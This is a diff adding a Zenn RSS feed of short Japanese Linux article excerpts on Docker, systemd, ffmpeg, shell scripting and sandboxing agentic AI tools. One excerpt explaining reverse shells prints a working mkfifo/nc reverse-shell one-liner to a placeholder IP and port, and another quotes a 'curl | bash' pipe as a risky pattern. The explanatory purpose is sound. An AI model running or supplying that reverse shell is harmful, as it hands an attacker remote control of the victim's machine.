@@ -1,0 +1,263 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Zennの「Linux」のフィード]]></title><description><![CDATA[Zennのトピック「Linux」のRSSフィードです]]></description><link>https://zenn.dev/topics/linux</link><image><url>https://storage.googleapis.com/zenn-user-upload/topics/860a9eb1e4.png</url><title>Zennの「Linux」のフィード</title><link>https://zenn.dev/topics/linux</link></image><generator>zenn.dev</generator><lastBuildDate>Thu, 31 Jul 2025 12:04:54 GMT</lastBuildDate><atom:link href="https://zenn.dev/topics/linux/feed" rel="self" type="application/rss+xml"/><language><![CDATA[ja]]></language><item><title><![CDATA[Linuxで一時ユーザーを作る方法]]></title><description><![CDATA[
+ Linuxで一時ユーザーを作る方法
+
+ 1. 有効期限付きで新規ユーザーを作成
+sudo useradd -e $(date -d "+7 days" +%F) user1
+sudo passwd user1
+手動で日付を指定する場合：
+sudo useradd -e 2025-08-06 user1
+sudo passwd user1
+
+ 2. 既存ユーザーに後から有効期限を設定
+sudo chage -E $(date -d "+10 days" +%F) user1
+具体的な日付で指定する場合：
+sudo chage -E 2025-08-09 user1
+
+ 3. パスワード...]]></description><link>https://zenn.dev/uepon/articles/b619beb55c21b3</link><guid isPermaLink="true">https://zenn.dev/uepon/articles/b619beb55c21b3</guid><pubDate>Thu, 31 Jul 2025 11:51:03 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--eXo8st67--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Linux%25E3%2581%25A7%25E4%25B8%2580%25E6%2599%2582%25E3%2583%25A6%25E3%2583%25BC%25E3%2582%25B6%25E3%2583%25BC%25E3%2582%2592%25E4%25BD%259C%25E3%2582%258B%25E6%2596%25B9%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:ue%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2lIVW4zSmVfbW43ZlowbXlNVXRtOXpyLWZ1S0J3YjVTVUhnMXJWSFE9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>ue</dc:creator></item><item><title><![CDATA[OSの仕組みとシステムコール入門 - 第2回 プロセスの生成と管理]]></title><description><![CDATA[
+ はじめに
+本記事では、OSの仕組みとシステムコール入門として、プロセスの生成・管理・終了について詳しく学びます。
+10回に渡ってOSについて学ぶ講座の第2回目です。
+⚠️本稿は参考資料としてお読みください。
+
+ 本講座の構成（全 10 回）
+
+OSとカーネルの基礎知識
+
+プロセスの生成と管理 ←今回
+
+ファイルシステムの基本
+システムコールの仕組み
+open, read, write の実例と挙動
+ネットワークソケット基礎
+strace/ltrace を使ったシステムコール解析
+マルチプロセス・マルチスレッドの考え方
+実践演習
+まとめ
+
+
+ プロセスとは
+プロセスは「実行中プログラム...]]></description><link>https://zenn.dev/ka_kan/articles/42ffc2b55fd3cd</link><guid isPermaLink="true">https://zenn.dev/ka_kan/articles/42ffc2b55fd3cd</guid><pubDate>Wed, 30 Jul 2025 12:49:30 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--W2SL3LMa--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:OS%25E3%2581%25AE%25E4%25BB%2595%25E7%25B5%2584%25E3%2581%25BF%25E3%2581%25A8%25E3%2582%25B7%25E3%2582%25B9%25E3%2583%2586%25E3%2583%25A0%25E3%2582%25B3%25E3%2583%25BC%25E3%2583%25AB%25E5%2585%25A5%25E9%2596%2580%2520-%2520%25E7%25AC%25AC2%25E5%259B%259E%2520%25E3%2583%2597%25E3%2583%25AD%25E3%2582%25BB%25E3%2582%25B9%25E3%2581%25AE%25E7%2594%259F%25E6%2588%2590%25E3%2581%25A8%25E7%25AE%25A1%25E7%2590%2586%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Kanda%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzVlOGJhYTMxOGYuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Kanda</dc:creator></item><item><title><![CDATA[Adobeで動画→GIF変換したら画像が小さすぎたのでLinuxでやる]]></title><description><![CDATA[
+ ffmpegコマンドについて解説
+
+ 0.はじめに
+先日Flaskアプリについての記事を執筆した際、Adobeのフリーツールでmp4をgifに変換する作業を行った。
+
+満足いく変換ができず複数回試したところで制限が来てしまい、使用できなくなった。
+履歴やCookie削除を行い、もう１度試したが利用できなかった。
+その後、ffmpegコマンドの存在を知り利用。うまくgif変換ができた。
+
+ 1. ffmpegコマンド使用方法
+sudo apt install ffmpeg -y
+Zennに今すぐ載せる用(変換したい動画の名前をinput.mp4にする)
+
+高画質版
+ffmpeg -i ...]]></description><link>https://zenn.dev/nickelth/articles/ffmpegtutorial</link><guid isPermaLink="true">https://zenn.dev/nickelth/articles/ffmpegtutorial</guid><pubDate>Wed, 30 Jul 2025 12:35:35 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--8QZnIe55--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Adobe%25E3%2581%25A7%25E5%258B%2595%25E7%2594%25BB%25E2%2586%2592GIF%25E5%25A4%2589%25E6%258F%259B%25E3%2581%2597%25E3%2581%259F%25E3%2582%2589%25E7%2594%25BB%25E5%2583%258F%25E3%2581%258C%25E5%25B0%258F%25E3%2581%2595%25E3%2581%2599%25E3%2581%258E%25E3%2581%259F%25E3%2581%25AE%25E3%2581%25A7Linux%25E3%2581%25A7%25E3%2582%2584%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2583%258B%25E3%2583%2583%25E3%2582%25B1%25E3%2583%25AB%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzU0Mjc3ODIwNWEuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>ニッケル</dc:creator></item><item><title><![CDATA[エンジニア必見！curl | bash が危険な理由と安全なDocker環境構築]]></title><description><![CDATA[
+ 🐳 はじめに
+!
+自身での技術調査とchatGPTを併用し、整理した記事になります。
+
+Dockerfileを書いていると、apt や curl をよく使いますよね。
+でも実は、その使い方を誤ると 「セキュリティリスク」 に直結することをご存知でしょうか？
+
+
+ ⚠️ なぜ curl | bash が危険なのか
+よく見かける例：
+curl -s https://example.com/install.sh | bash
+
+ 危険な理由
+
+スクリプトを確認せずに実行
+root 権限で動作することが多い
+改ざんされていれば即アウト
+
+
+
+ ✅ apt install は安全なのか？
+ap...]]></description><link>https://zenn.dev/hi_kun0912/articles/9f86ce1ef4925b</link><guid isPermaLink="true">https://zenn.dev/hi_kun0912/articles/9f86ce1ef4925b</guid><pubDate>Wed, 30 Jul 2025 09:02:41 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--hGD3VMcR--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25A8%25E3%2583%25B3%25E3%2582%25B8%25E3%2583%258B%25E3%2582%25A2%25E5%25BF%2585%25E8%25A6%258B%25EF%25BC%2581curl%2520%257C%2520bash%2520%25E3%2581%258C%25E5%258D%25B1%25E9%2599%25BA%25E3%2581%25AA%25E7%2590%2586%25E7%2594%25B1%25E3%2581%25A8%25E5%25AE%2589%25E5%2585%25A8%25E3%2581%25AADocker%25E7%2592%25B0%25E5%25A2%2583%25E6%25A7%258B%25E7%25AF%2589%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E6%2581%25AF%25E5%25AD%2590%25E6%25BA%25BA%25E6%2584%259B%25E3%2583%2591%25E3%2583%2591%2540%25E3%2582%25A8%25E3%2583%25B3%25E3%2582%25B8%25E3%2583%258B%25E3%2582%25A2%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2VhYjMzZWZkYTQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>息子溺愛パパ@エンジニア</dc:creator></item><item><title><![CDATA[bashのコマンドキャッシュでハマった話]]></title><description><![CDATA[
+ 経緯
+Windows11のWSL2でUbuntuを使っており、qemuをaptでインストールした。
+しかしapt経由でインストールできるqemuはバージョンがかなり古かったので、直接ソースコードを落としてきてビルドすることにした。
+既存のqemuはアンインストールし、ビルドした最新版のqemuをインストールした。
+qemuがインストールされたか確認するためqemu-system-x86_64 --versionを実行したところ、以下のエラーが出た。
+-bash: /usr/bin/qemu-system-x86_64: No such file or directory
+
+ 解決策に...]]></description><link>https://zenn.dev/luxun1910/articles/d2dcc2f0805728</link><guid isPermaLink="true">https://zenn.dev/luxun1910/articles/d2dcc2f0805728</guid><pubDate>Wed, 30 Jul 2025 05:03:42 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--bu2oXHSO--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:bash%25E3%2581%25AE%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2582%25AD%25E3%2583%25A3%25E3%2583%2583%25E3%2582%25B7%25E3%2583%25A5%25E3%2581%25A7%25E3%2583%258F%25E3%2583%259E%25E3%2581%25A3%25E3%2581%259F%25E8%25A9%25B1%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2582%258B%25E3%2583%25BC%25E3%2581%2597%25E3%2582%2585%25E3%2582%2593%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2dBZFdnQnc3NEMtSE9VekhVX05BcGxIeTlvaGdjQTdZMWptTnp3bVVFPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>るーしゅん</dc:creator></item><item><title><![CDATA[【Raspberry Pi】RAMディスク化するとDockerが起動できなくなる]]></title><description><![CDATA[
+ はじめに
+現在、Raspberry Piをベースとした、新しい監視カメラシステムを開発中ですが、そこで利用している様々な技術的なトピックをメモ代わりにまとめていきたいと思います。
+今回は、RAMディスク化すると、Dockerが起動できなくなる問題への対策を説明します。
+※RAMディスク化の方法についてはこちらの記事を参照してください
+https://zenn.dev/daddy_yukio/articles/a722e6c024efaf
+
+ 概要
+Raspberry Piを使用して、IoTデバイスを開発し、実運用していく為に必要なRAMディスク化ですが、一つ大きな問題があります。
+そ...]]></description><link>https://zenn.dev/daddy_yukio/articles/902a9c415945d7</link><guid isPermaLink="true">https://zenn.dev/daddy_yukio/articles/902a9c415945d7</guid><pubDate>Wed, 30 Jul 2025 04:45:15 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--D6F-hrCo--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Raspberry%2520Pi%25E3%2580%2591RAM%25E3%2583%2587%25E3%2582%25A3%25E3%2582%25B9%25E3%2582%25AF%25E5%258C%2596%25E3%2581%2599%25E3%2582%258B%25E3%2581%25A8Docker%25E3%2581%258C%25E8%25B5%25B7%25E5%258B%2595%25E3%2581%25A7%25E3%2581%258D%25E3%2581%25AA%25E3%2581%258F%25E3%2581%25AA%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Yukio%2520Ichikawa%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2JlZmZiNTY4YWQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Yukio Ichikawa</dc:creator></item><item><title><![CDATA[【Docker】port is already allocated エラーの解決手順]]></title><description><![CDATA[
+ はじめに
+Dockerを使って開発をしていると、「Bind for 0.0.0.0:3000 failed: port is already allocated」エラーに遭遇することがあります。これは指定したポートが既に他のプロセスやコンテナによって使用されているときに発生します。
+解決策はシンプルで、何がポートを使用しているか確認し、該当するコンテナやプロセスを適切に停止することです。
+では実際にその手順について説明していきます。
+
+ 急ぎの方への最短解決パス
+!
+細けぇことはいいからぱぱっと解決すっぞという方へ
+以下のコマンドを順番に実行すれば、たいてい解決するかと思います。
+
+...]]></description><link>https://zenn.dev/n_haru2/articles/1b0e5af17e5440</link><guid isPermaLink="true">https://zenn.dev/n_haru2/articles/1b0e5af17e5440</guid><pubDate>Tue, 29 Jul 2025 17:50:57 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--toWDaj8T--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Docker%25E3%2580%2591port%2520is%2520already%2520allocated%2520%25E3%2582%25A8%25E3%2583%25A9%25E3%2583%25BC%25E3%2581%25AE%25E8%25A7%25A3%25E6%25B1%25BA%25E6%2589%258B%25E9%25A0%2586%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:pen2%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhkYmJjY2MwZmYuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>pen2</dc:creator></item><item><title><![CDATA[シェルスクリプトでファイルやコマンドの実行結果を1行ずつ処理する]]></title><description><![CDATA[
+ やりたいこと
+シェルスクリプトでファイルやコマンドの実行結果を1行ずつ処理したい。
+
+ 方法
+以下のように while read を使えばよい。
+
+ ファイルの各行を処理
+# ファイルの各行を処理
+while IFS= read -r line; do
+    echo "${line}"
+done &lt; test.txt
+# 実行結果
+[profile A]
+credential_source = Ec2InstanceMetadata
+role_arn = arn:aws:iam::111111111111:role/RoleA
+role_session_name = Pro...]]></description><link>https://zenn.dev/namusour0763/articles/shellscript-lines-20250730</link><guid isPermaLink="true">https://zenn.dev/namusour0763/articles/shellscript-lines-20250730</guid><pubDate>Tue, 29 Jul 2025 16:50:28 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--_3vI-82D--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2588%25E3%2581%25A7%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%2584%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2581%25AE%25E5%25AE%259F%25E8%25A1%258C%25E7%25B5%2590%25E6%259E%259C%25E3%2582%25921%25E8%25A1%258C%25E3%2581%259A%25E3%2581%25A4%25E5%2587%25A6%25E7%2590%2586%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2581%25AA%25E3%2582%2580%25E3%2582%25B5%25E3%2583%25AF%25E3%2583%25BC%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTHpGRXZZNXNjRTlmbHkxcmdzbGxQSWZjLXJVR0dldlNtRF9ubnNXRVh4OHU0S09tcz1zOTYtYw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>なむサワー</dc:creator></item><item><title><![CDATA[Claude Codeにファイルシステムを破壊されたくないLinuxユーザーへ]]></title><description><![CDATA[ちまたでときどき話題になっているClaude Codeをはじめとしたエージェント型AIによるファイルシステムの破壊を防げそうなのでメモ。
+
+ 前提条件
+
+Claude CodeなどCLI型の実行形態をとる
+ローカルのファイルシステムを破壊されたくない
+プロジェクトのコードは書き換えできるようにしたい
+任意のネットワークにデータが送られるのは許容する
+devcontainerだとコンテナ外のデータにアクセスさせるのにマウントしなおしたりパス変わったりで面倒
+とにかくローカルのファイルシステムを破壊しなければよい
+
+
+ 解決策
+Bubblewrap / brwap を使う。
+https://...]]></description><link>https://zenn.dev/jbking/articles/d8b78a6aec9c01b6f713</link><guid isPermaLink="true">https://zenn.dev/jbking/articles/d8b78a6aec9c01b6f713</guid><pubDate>Tue, 29 Jul 2025 08:48:13 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--SibjKWGb--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Claude%2520Code%25E3%2581%25AB%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%25B7%25E3%2582%25B9%25E3%2583%2586%25E3%2583%25A0%25E3%2582%2592%25E7%25A0%25B4%25E5%25A3%258A%25E3%2581%2595%25E3%2582%258C%25E3%2581%259F%25E3%2581%258F%25E3%2581%25AA%25E3%2581%2584Linux%25E3%2583%25A6%25E3%2583%25BC%25E3%2582%25B6%25E3%2583%25BC%25E3%2581%25B8%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:jbking%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhhYzgxN2QwZTAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>jbking</dc:creator></item><item><title><![CDATA[【prometheus】 の理解を深める]]></title><description><![CDATA[
+ はじめに
+以前、Prometheus と Grafana の環境構築を行いました。構築自体はできたものの、仕組みの理解が浅かったため、理解を深める目的で今回アウトプットすることにしました。
+https://zenn.dev/eiken/articles/a5a61770531c70
+
+ 1. prometheus とは
+prometheus は、システムやアプリケーションから収集した メトリクス（時系列データ） をもとに、監視や可視化を行うオープンソースのソフトウェアです。
+少し難しく書くとすれば、エクスポーターなどから HTTP 経由でメトリクスを収集し、内部の時系列データベースに...]]></description><link>https://zenn.dev/eiken/articles/75b1b640cb744c</link><guid isPermaLink="true">https://zenn.dev/eiken/articles/75b1b640cb744c</guid><pubDate>Tue, 29 Jul 2025 07:52:56 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xSCSL6bk--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590prometheus%25E3%2580%2591%2520%25E3%2581%25AE%25E7%2590%2586%25E8%25A7%25A3%25E3%2582%2592%25E6%25B7%25B1%25E3%2582%2581%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:enjine%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly96ZW5uLWRldi5naXRodWIuaW8vZGVmYXVsdC1hdmF0YXJzL2RhcmsvZS5wbmc=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>enjine</dc:creator></item><item><title><![CDATA[プログラミング雑記 2025/07/29]]></title><description><![CDATA[
+ 今日の一押し
+https://ocw.u-tokyo.ac.jp/course_11482/
+東京大学のオープンコースウェア。これが無料なのすごい。
+
+ プログラミング
+
+ .NET
+https://weekref.net/2025/07/28/updates
+高速なC#を書くために知っておくべきもの
+ReSharper先生に言われるがままにコードを直していくのです。。。
+
+ Go言語
+それ CLI フレームワークがなくてもできるよ / Building CLI Tools Without Frameworks - Speaker Deck
+サードパーティのCLIフレームワークを使わ...]]></description><link>https://zenn.dev/baleenstudio/articles/69a9395c904b4c</link><guid isPermaLink="true">https://zenn.dev/baleenstudio/articles/69a9395c904b4c</guid><pubDate>Tue, 29 Jul 2025 06:12:50 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--MDXLBBXC--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%2597%25E3%2583%25AD%25E3%2582%25B0%25E3%2583%25A9%25E3%2583%259F%25E3%2583%25B3%25E3%2582%25B0%25E9%259B%2591%25E8%25A8%2598%25202025%252F07%252F29%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_34:%25E7%259F%25B3%25E5%259D%2582%25E5%25BF%25A0%25E5%25BA%2583%2Cx_220%2Cy_108/bo_3px_solid_rgb:d6e3ed%2Cg_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzlkNzhkNjY2ODcuanBlZw==%2Cr_20%2Cw_90%2Cx_92%2Cy_102/g_south_west%2Ch_34%2Cl_default:og-publication-pro-mark-xcosax%2Cw_34%2Cx_217%2Cy_158/co_rgb:6e7b85%2Cg_south_west%2Cl_text:notosansjp-medium.otf_30:%25E6%25A0%25AA%25E5%25BC%258F%25E4%25BC%259A%25E7%25A4%25BEBALEEN%2520STUDIO%2Cx_255%2Cy_160/bo_4px_solid_white%2Cg_south_west%2Ch_50%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2dKOU1PLWxUQU1OQUVuMy1sZlQ5VzI4TWpoX2FxQXI3bzQ0c0xjVUE9czk2LWM=%2Cr_max%2Cw_50%2Cx_139%2Cy_84/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>石坂忠広</dc:creator></item><item><title><![CDATA[3年前に使っていたDocker ComposeとLinuxサービスファイルの備忘録]]></title><description><![CDATA[
+ ✅ はじめに
+本記事では、3年前の開発環境で実際に使用していた Docker Compose 設定と、
+Linux上でコンテナを自動起動する systemd のサービス定義を備忘録として残します。
+使用目的は、SQL Server（MSSQL）コンテナを構成し、定期的に稼働させる開発用途です。
+
+OS：Ubuntu 20.04 LTS
+Docker：20.x 系（Docker Compose CLI）
+コンテナ：SQL Server 2022 on Linux（Microsoft公式）
+
+
+
+ ✅ ディレクトリ構成（例）
+project-root/
+├── docker-compos...]]></description><link>https://zenn.dev/mono_tec/articles/zenn_docker_systemd_tips</link><guid isPermaLink="true">https://zenn.dev/mono_tec/articles/zenn_docker_systemd_tips</guid><pubDate>Mon, 28 Jul 2025 13:44:20 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--T4tBxh7v--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:3%25E5%25B9%25B4%25E5%2589%258D%25E3%2581%25AB%25E4%25BD%25BF%25E3%2581%25A3%25E3%2581%25A6%25E3%2581%2584%25E3%2581%259FDocker%2520Compose%25E3%2581%25A8Linux%25E3%2582%25B5%25E3%2583%25BC%25E3%2583%2593%25E3%2582%25B9%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2581%25AE%25E5%2582%2599%25E5%25BF%2598%25E9%258C%25B2%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:mono-tec%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSTZaVkRsSjViekNjM2RteXoyM3FGV0JEMldnZUttRnByaXR2aktHWHBFMFVudlNnPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>mono-tec</dc:creator></item><item><title><![CDATA[リバースシェルの解説（mkfifo編）]]></title><description><![CDATA[
+ 攻撃コマンドの紹介
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;IP&gt; &lt;Port&gt; &gt; /tmp/f
+
+ mkfifoとか使われているの見たことないよね
+mkfifoは名前付きパイプとして認識されるファイルらしきものを作成するコマンドである。
+名前付きパイプが日常的にシェルで使われている例に遭遇することはほとんどないと思う。
+名前付きパイプをls -lで見てみるとpと表示されている。
+# ll
+total 0
+prw-r--r-- 1 root root ...]]></description><link>https://zenn.dev/ssynkazu/articles/815630c2be9079</link><guid isPermaLink="true">https://zenn.dev/ssynkazu/articles/815630c2be9079</guid><pubDate>Mon, 28 Jul 2025 13:09:06 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--DAInGD2---/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%25AA%25E3%2583%2590%25E3%2583%25BC%25E3%2582%25B9%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2581%25AE%25E8%25A7%25A3%25E8%25AA%25AC%25EF%25BC%2588mkfifo%25E7%25B7%25A8%25EF%25BC%2589%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E6%2598%25A0%25E7%2594%25BB%25E3%2581%25AB%25E5%2587%25BA%25E3%2581%25A6%25E3%2581%258F%25E3%2582%258B%25E3%2583%258F%25E3%2583%2583%25E3%2582%25AB%25E3%2583%25BC%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jS3hLUEs0dWVxWEZrc1RhMGxkNEgtNWNScnBuYU5JTjF2bUFLLURKTUtQc3ptSGtnPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>映画に出てくるハッカー</dc:creator></item><item><title><![CDATA[【Linux】systemdのサービス起動順位の確認方法]]></title><description><![CDATA[
+ はじめに
+systemd のユニットファイルを作成する際、あるユニットの起動後にサービスを実行したいことがあります。今回は、/etc/fstab に記載された nfsマウントの後に動作するサービスを作成する必要があった為、nfsマウントがどのユニット名で扱われているのか調べた方法を備忘録として残しておきます。
+
+ 作業内容
+インストールされているユニットの中から nfs 関連のサービス起動の流れを確認します。
+root@fedora:~# systemctl list-unit-files | grep nfs
+proc-fs-nfsd.mount                  ...]]></description><link>https://zenn.dev/eiken/articles/e45e3ca41a61ba</link><guid isPermaLink="true">https://zenn.dev/eiken/articles/e45e3ca41a61ba</guid><pubDate>Mon, 28 Jul 2025 09:49:55 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--TryyKihB--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Linux%25E3%2580%2591systemd%25E3%2581%25AE%25E3%2582%25B5%25E3%2583%25BC%25E3%2583%2593%25E3%2582%25B9%25E8%25B5%25B7%25E5%258B%2595%25E9%25A0%2586%25E4%25BD%258D%25E3%2581%25AE%25E7%25A2%25BA%25E8%25AA%258D%25E6%2596%25B9%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:enjine%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly96ZW5uLWRldi5naXRodWIuaW8vZGVmYXVsdC1hdmF0YXJzL2RhcmsvZS5wbmc=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>enjine</dc:creator></item><item><title><![CDATA[【Linux入門】SSHでサーバーに直接アクセスしてファイル操作する目的とは？〜Gitとの違いも解説〜]]></title><description><![CDATA[
+ はじめに
+git によってファイル内容を変更・更新できるのに、なぜわざわざサーバーに直接アクセスしてファイルを操作するんだろう？という疑問を持ちました。
+そこで、Gitによるファイル内容の更新とサーバへの反映（git pullなど）と、サーバーに直接アクセスしてファイルを操作することの違いについてChatGPTに質問した結果をまとめました。
+本記事は、その質問結果を簡潔にまとめています。
+※なお、表はChatGPTの解説のものを引用しております。
+
+ SSHでサーバーに直接アクセスする目的とは？
+
+ 結論
+
+SSHは主に「Gitで管理されないもの」にアクセスするために使う
